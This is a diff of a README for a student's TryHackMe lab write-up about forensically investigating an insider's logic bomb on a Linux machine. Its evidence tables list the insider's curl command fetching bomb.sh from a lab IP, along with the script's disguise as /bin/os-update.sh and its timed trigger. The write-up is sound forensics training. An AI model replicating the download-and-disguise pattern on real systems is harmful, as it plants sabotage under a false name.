@@ -1,58 +1,44 @@
 # 🧨 Logic Bomb Forensics Investigation (TryHackMe)
 
-This project documents my forensic investigation of a suspicious Linux machine during the **"Logic Bomb"** TryHackMe room scenario. I performed a full analysis of the system using CLI tools to uncover evidence of insider threat activity and a logic bomb set to execute under specific conditions.
+## 🧭 Objective
+Investigate a Linux workstation used by a malicious insider to uncover signs of sabotage, privilege escalation, and a logic bomb designed to execute under specific conditions.
 
----
+## 🧪 Tools & Techniques Used
+- **Command-Line Tools**: `journalctl`, `grep`, `cat`, `curl`, `vi`
+- **Linux Forensics**: Log review, file metadata inspection, user auditing
+- **Threat Detection**: Insider threat patterns, script analysis
+- **Cron Job & Script Forensics**
 
-## 🕵️ Scenario Summary
+## 🔍 Key Findings / Evidence
+| Action                     | Details                                           |
+|---------------------------|---------------------------------------------------|
+| 📦 Package Installed      | `/usr/bin/apt install dokuwiki`                  |
+| 📁 Working Directory      | `/home/cybert`                                   |
+| 👤 Suspicious User        | `it-admin`                                       |
+| 🔐 Sudoers Modified       | `Dec 28 06:27:34`                                |
+| 📝 Script Created         | `bomb.sh`                                        |
+| 🌐 Script Source          | `curl 10.10.158.38:8080/bomb.sh --output bomb.sh`|
+| 🛠️ Renamed Script         | `/bin/os-update.sh`                              |
+| 📄 Triggered File Output  | `goodbye.txt`                                    |
+| ⏰ Execution Time         | Scheduled for 08:00 AM (via cron or similar)     |
 
-An employee from CyberT’s IT department was arrested for operating a phishing ring. Our task was to investigate their last workstation for evidence of sabotage or malicious behavior. By analyzing logs and files, we uncovered a logic bomb designed to damage systems if certain triggers were met.
+## 📖 Analysis Summary
+- A user named `it-admin` was created with elevated privileges.
+- The user downloaded a malicious script and disguised it as a system update.
+- The logic bomb was timed to execute silently and create a message file.
+- Logs showed the exact timeline of suspicious privilege escalation.
 
----
+## 🧠 Skills Demonstrated
+- Insider threat detection
+- Linux privilege escalation forensics
+- Cron job and logic bomb analysis
+- Timeline reconstruction via system logs
 
-## 🔧 Tools & Skills Demonstrated
+## 🧰 Real-World Application
+This mirrors real IR cases involving rogue insiders or misconfigured automation. It shows how seemingly benign user actions can escalate into system-wide compromise.
 
-- **Command-Line Tools:** `journalctl`, `grep`, `cat`, `curl`, `vi`
-- **Linux Forensics:** Privilege escalation auditing, script analysis, file metadata
-- **Threat Analysis:** Insider threats, logic bomb behavior, malicious automation
-- **File & Cron Investigation:** User creation, sudo access modification, scheduled execution
+## 🎓 Lessons Learned
+I gained hands-on experience identifying logic bombs and investigating user abuse through log and script analysis. It helped demystify how subtle sabotage can hide in operational scripts.
 
----
-
-## 📂 Key Evidence Recovered
-
-| Action | Details |
-|-------|---------|
-| 📦 Package Installed | `/usr/bin/apt install dokuwiki` |
-| 📁 Working Directory | `/home/cybert` |
-| 👤 Suspicious User Created | `it-admin` |
-| 🔐 Sudoers Modified | `Dec 28 06:27:34` |
-| 📝 Script Created | `bomb.sh` |
-| 🌐 Source of Script | `curl 10.10.158.38:8080/bomb.sh --output bomb.sh` |
-| 🛠️ Renamed Script | `/bin/os-update.sh` |
-| 📅 Modified Timestamp | `Dec 28 06:29` |
-| 📄 File Created on Execution | `goodbye.txt` |
-| ⏰ Scheduled Trigger | `08:00 AM` (via cron or scheduled task) |
-
----
-
-## 📖 What I Learned
-
-> This lab taught me how to trace suspicious Linux activity, analyze logs for privilege escalation, and reverse-engineer a logic bomb scenario using basic CLI tools. It sharpened my ability to investigate real-world sabotage tactics and understand how insider threats hide in plain sight.
-
----
-
-## 💼 How This Applies in the Real World
-
-- Detecting unauthorized user creation
-- Tracking privilege escalation in system logs
-- Identifying timed execution scripts (logic bombs)
-- Recognizing file tampering or covert data destruction attempts
-
----
-
-## 📎 Related Tags
-
-`#linux-forensics` `#logic-bomb` `#tryhackme` `#malware-analysis` `#insider-threats` `#curl` `#bash-scripting` `#cybersecurity-project`
-
-
+## ✅ Completion Status
+Completed via TryHackMe – Logic Bomb Room
